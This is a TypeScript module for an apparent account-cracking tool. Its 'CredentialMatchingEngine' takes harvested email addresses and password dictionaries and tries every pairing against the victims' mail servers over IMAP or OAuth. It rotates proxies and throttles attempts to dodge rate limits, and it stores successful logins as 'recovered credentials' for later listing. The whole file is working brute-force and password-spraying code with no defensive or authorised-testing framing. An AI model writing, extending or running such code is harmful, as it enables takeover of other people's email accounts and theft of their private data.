import IORedis from "ioredis";
import { db } from "../db.js";
import { IMAPVerifier } from "../imap/verifier.js";
import { OAuthClient } from "../oauth/client.js";
import { HttpClient } from "../http/client.js";
import { getImapConfig } from "../imap/host-resolver.js";
import { AuthAttemptController, type AttemptConfig } from "./attempt-controller.js";
import { AuthSuccessDetector } from "./success-detector.js";
import { saveRecoveredCredential } from "./recovered-credentials.js";
import { config } from "../../config.js";

const CACHE_TTL = 7 * 24 * 60 * 60; // 7 days
const PASSWORD_BATCH = 100;

export interface MatchingOptions {
  taskId?: number;
  emails?: string[];
  dictionaryIds: number[];
  method?: "imap" | "oauth";
  maxAttemptsPerEmail?: number;
  throttleConfig?: Partial<AttemptConfig>;
}

export interface MatchingProgress {
  totalEmails: number;
  processed: number;
  found: number;
  notFound: number;
  errors: number;
  currentEmail?: string;
  currentPasswordIndex?: number;
  totalPasswords?: number;
}

export interface MatchingResult {
  totalEmails: number;
  found: number;
  notFound: number;
  errors: number;
  duration: number;
  matches: Array<{ email: string; password: string }>;
}

export class CredentialMatchingEngine {
  private userId: number;
  private redis: IORedis;
  private cancelled = false;
  private controller: AuthAttemptController;
  private detector: AuthSuccessDetector;
  public progress: MatchingProgress = {
    totalEmails: 0,
    processed: 0,
    found: 0,
    notFound: 0,
    errors: 0,
  };

  constructor(userId: number, throttleConfig?: Partial<AttemptConfig>) {
    this.userId = userId;
    this.redis = new IORedis(config.redis.url);
    this.controller = new AuthAttemptController(throttleConfig);
    this.detector = new AuthSuccessDetector();
  }

  cancel() {
    this.cancelled = true;
  }

  async run(options: MatchingOptions): Promise<MatchingResult> {
    const startTime = Date.now();
    const matches: Array<{ email: string; password: string }> = [];

    // Load proxies for rotation
    await this.controller.loadProxies();

    try {
      // Load emails
      let emails: string[];
      if (options.emails && options.emails.length > 0) {
        emails = options.emails;
      } else if (options.taskId) {
        const records = await db.email.findMany({
          where: { taskId: options.taskId, status: "MX_FOUND" },
          select: { email: true },
        });
        emails = records.map((r) => r.email);
      } else {
        return this.buildResult(matches, startTime);
      }

      // Load all passwords from selected dictionaries
      const passwords = await this.loadPasswords(options.dictionaryIds);

      if (passwords.length === 0 || emails.length === 0) {
        return this.buildResult(matches, startTime);
      }

      this.progress.totalPasswords = passwords.length;

      this.progress.totalEmails = emails.length;

      // Setup auth method
      const method = options.method ?? "imap";
      const maxAttempts = options.maxAttemptsPerEmail ?? passwords.length;

      for (const email of emails) {
        if (this.cancelled) break;

        this.progress.currentEmail = email;

        // Check if already found
        const existing = await db.credentialMatch.findUnique({
          where: { userId_email: { userId: this.userId, email } },
        });

        if (existing?.status === "found") {
          this.progress.found++;
          this.progress.processed++;
          if (existing.password) {
            matches.push({ email, password: existing.password });
          }
          continue;
        }

        // Get tried passwords from cache
        const cacheKey = `match-tried:${this.userId}:${email}`;
        const tried = await this.redis.smembers(cacheKey);
        const triedSet = new Set(tried);

        // Filter passwords not yet tried
        const toTry = passwords
          .filter((p) => !triedSet.has(p))
          .slice(0, maxAttempts);

        let found = false;

        for (let i = 0; i < toTry.length; i++) {
          if (this.cancelled) break;

          this.progress.currentPasswordIndex = i + 1;

          // Rate-limit controller check
          const check = await this.controller.beforeAttempt(email);
          if (!check.allowed) break;

          const password = toTry[i];
          const success = await this.tryAuth(email, password, method);

          // Track attempt in controller (detect rate-limit)
          this.controller.afterAttempt(email, false);

          // Cache this attempt
          await this.redis.sadd(cacheKey, password);
          if (i === 0) await this.redis.expire(cacheKey, CACHE_TTL);

          if (success) {
            found = true;
            this.progress.found++;
            matches.push({ email, password });

            // Detailed detection + save to recovered_credentials
            const detection = await this.detector.detect(email, password, method);
            if (detection.success) {
              await saveRecoveredCredential(
                this.userId, email, password, detection, method,
              ).catch(() => {});
            }

            await db.credentialMatch.upsert({
              where: { userId_email: { userId: this.userId, email } },
              create: {
                userId: this.userId,
                email,
                password,
                status: "found",
                attempts: (existing?.attempts ?? 0) + i + 1,
                foundAt: new Date(),
              },
              update: {
                password,
                status: "found",
                attempts: (existing?.attempts ?? 0) + i + 1,
                foundAt: new Date(),
              },
            });

            break;
          }
        }

        if (!found && !this.cancelled) {
          if (toTry.length > 0) {
            await db.credentialMatch.upsert({
              where: { userId_email: { userId: this.userId, email } },
              create: {
                userId: this.userId,
                email,
                status: "not_found",
                attempts: (existing?.attempts ?? 0) + toTry.length,
              },
              update: {
                status: "not_found",
                attempts: (existing?.attempts ?? 0) + toTry.length,
              },
            });
            this.progress.notFound++;
          } else {
            this.progress.notFound++;
          }
        }

        this.progress.processed++;
      }

      return this.buildResult(matches, startTime);
    } finally {
      this.redis.disconnect();
    }
  }

  private async loadPasswords(dictionaryIds: number[]): Promise<string[]> {
    const all: string[] = [];

    for (const dictId of dictionaryIds) {
      let skip = 0;
      while (true) {
        const batch = await db.dictionaryPassword.findMany({
          where: { dictionaryId: dictId },
          select: { password: true },
          skip,
          take: PASSWORD_BATCH,
          orderBy: { id: "asc" },
        });
        if (batch.length === 0) break;
        all.push(...batch.map((b) => b.password));
        skip += batch.length;
        if (batch.length < PASSWORD_BATCH) break;
      }
    }

    return all;
  }

  private async tryAuth(
    email: string,
    password: string,
    method: "imap" | "oauth",
  ): Promise<boolean> {
    try {
      if (method === "oauth") {
        const httpClient = new HttpClient();
        const oauthClient = new OAuthClient(httpClient);
        const result = await oauthClient.authenticate(null, email, password);
        return result.success;
      }

      // IMAP method
      const imapConfig = getImapConfig(email);
      if (!imapConfig) return false;

      const verifier = new IMAPVerifier(15_000);
      const result = await verifier.tryAuthenticate({
        host: imapConfig.host,
        port: imapConfig.port,
        user: email,
        password,
        tls: true,
      });

      return result.success;
    } catch {
      return false;
    }
  }

  private buildResult(
    matches: Array<{ email: string; password: string }>,
    startTime: number,
  ): MatchingResult {
    return {
      totalEmails: this.progress.totalEmails,
      found: this.progress.found,
      notFound: this.progress.notFound,
      errors: this.progress.errors,
      duration: Date.now() - startTime,
      matches,
    };
  }
}

export async function getMatchingStats(userId: number) {
  const [total, byStatus] = await Promise.all([
    db.credentialMatch.count({ where: { userId } }),
    db.credentialMatch.groupBy({
      by: ["status"],
      where: { userId },
      _count: true,
    }),
  ]);

  return {
    total,
    byStatus: Object.fromEntries(byStatus.map((s) => [s.status, s._count])),
  };
}

export async function getFoundMatches(userId: number) {
  return db.credentialMatch.findMany({
    where: { userId, status: "found" },
    select: { email: true, password: true, foundAt: true, attempts: true },
    orderBy: { foundAt: "desc" },
  });
}
